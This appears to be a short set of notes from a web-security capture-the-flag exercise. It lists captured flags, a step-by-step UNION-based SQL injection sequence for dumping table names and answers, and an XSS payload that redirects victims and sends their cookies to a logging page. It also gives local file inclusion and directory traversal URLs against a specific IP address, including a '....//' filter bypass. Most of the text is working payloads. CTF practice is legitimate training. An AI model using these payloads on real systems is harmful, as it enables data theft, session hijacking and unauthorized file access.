EditThisCookie
ModHeader
Google Dev > Network > Right Click Name > Copy > To CURL

Flags:
flag{p011yw09_t0_5h311b@g}
flag{1_4m_7h3_g0d_0f_cr@f75m4n5h1p}
flag{1m_7#3_brv73_w@2210r_0f_ju571c3}
flag{h0w_d1d_y0u_g3t_th3_@n5w3r5s?}
flag{y0u_h@v3_0bt@ln3d_Za1n0nLyfL@9}
flag{M3_w@n7_c0ok1e_m3_5teal_co0ki3}
flag{t#3_dr3@m_15_r3@1}
flag{jv5t_h0w_m@ny_f1173rs_@r3_th3r3?!}

Header Tampering:
Cookies, User-Agent

SQLi:
1. Guess amount of columns within table: ' order by 5 #
2. Find which columns are being printed, 1=0 is to set 1st table to all false and to reduce results: ' and 1=0 union select 1,2,3,4,5 #
3. Get database name (optional): ' and 1=0 union select 1,2,3,database(),5 #
4. Get table names: ' and 1=0 union select 1,2,3,table_name,5 from information_schema.tables where table_type='BASE TABLE' limit 6#
5. Get column names: ' and 1=0 union select 1,2,3,column_name,5 from information_schema.columns where table_name='questionBank' limit 6#
6. Get answers: ' and 1=0 union select 1,2,3,answer,5 from questionBank limit 6#

Table Name: items; Column Names: name, price
' and 1=0 union select 1,2,table_name from information_schema.tables where table_type='BASE TABLE' and table_name like '%items%' #

XSS:
Force someone to visit a page and to dump his cookies
<script>document.location="log.php?uid=DYodw0Ibxv7Og3z78go0&description="
 + document.cookie</script>

Local File Inclusion:
http://128.199.224.160:3006/town.php?player=kahwi_leonard

Directory Traversal:
http://128.199.224.160:3006/town.php?player=../../../../../miami/lebron_james
"../" -> "....//" basic defence
http://128.199.224.160:3007/town.php?file=....//....//....//....//....//....//....//....//....//spurs/gregg_popovich

github.com/tanhengyeow/ctf101-web-2017

